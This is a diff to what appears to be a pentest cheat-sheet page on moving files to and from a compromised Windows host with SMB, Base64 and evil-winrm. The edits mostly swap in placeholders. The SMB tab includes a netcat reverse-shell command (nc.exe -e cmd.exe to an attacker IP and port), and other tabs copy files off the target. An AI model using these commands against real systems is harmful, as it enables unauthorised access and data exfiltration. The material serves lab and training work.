@@ -4,7 +4,6 @@ date: 2024-6-26
 tags: ["file transfer", "Windows", "smb", "evil-winrm"]
 ---
 
----
 {{< tab set1 tab1 active >}}SMB{{< /tab >}}
 {{< tab set1 tab2 >}}Base64{{< /tab >}}
 {{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
@@ -14,7 +13,7 @@ tags: ["file transfer", "Windows", "smb", "evil-winrm"]
 
 <div>
 
-```bash
+```console
 impacket-smbserver share . -smb2support
 ```
 
@@ -24,39 +23,39 @@ impacket-smbserver share . -smb2support
 
 <div>
 
-```powershell
+```console
 # Connect to SMB server without creds
-net use \\10.10.14.10\share
+net use \\<LOCAL_IP>\share
 ```
 
-```powershell
+```console
 # Connect to SMB server with creds
-net use \\10.10.14.10\share /u:<USER> <PASSWORD>
+net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>'
 ```
 
-```powershell
+```console
 # From target Windows to local Linux
-copy example.txt \\10.10.14.10\share
+copy <FILE> \\<LOCAL_IP>\share
 ```
 
-```powershell
+```console
 # From local Linux to target Windows
-copy \\10.10.14.10\share\example.txt example.txt
+copy \\<LOCAL_IP>\share\<FILE> <FILE>
 ```
 
-```powershell
+```console
 # Delete file
-del example.txt
+del <FILE>
 ```
 
-```powershell
+```console
 # Remove SMB share
-net use /d \\10.10.14.10\share
+net use /d \\<LOCAL_IP>\share
 ```
 
-```powershell
+```console
 # Older Windows (e.g. xp), use directly
-\\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 443
+\\<LOCAL_IP>\share\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>
 ```
 
 </div>
@@ -68,14 +67,14 @@ net use /d \\10.10.14.10\share
 
 <div>
 
-```powershell
+```console
 # In target Windows
-[System.convert]::ToBase64String((Get-Content -Path 'C:\ProgramData\example.exe' -Encoding Byte))
+[System.convert]::ToBase64String((Get-Content -Path 'C:\ProgramData\<FILE>' -Encoding Byte))
 ```
 
-```bash
+```console
 # Copy and paste the base64 encoded binary to local Linux
-echo -n '<BASE64_BINARY>' | base64 -d > example.exe
+echo -n '<BASE64_BINARY>' | base64 -d > <FILE>
 ```
 
 <small>*Note: For restricted environment*</small>
@@ -87,9 +86,9 @@ echo -n '<BASE64_BINARY>' | base64 -d > example.exe
 
 <div>
 
-```bash
+```console
 # Evil-winrm built-in function
-download "C:\ProgramData\example.txt" "/tmp/example.txt"
+download 'C:\ProgramData\<FILE>' '<LOCAL_DEST_PATH>'
 ```
 
 </div>
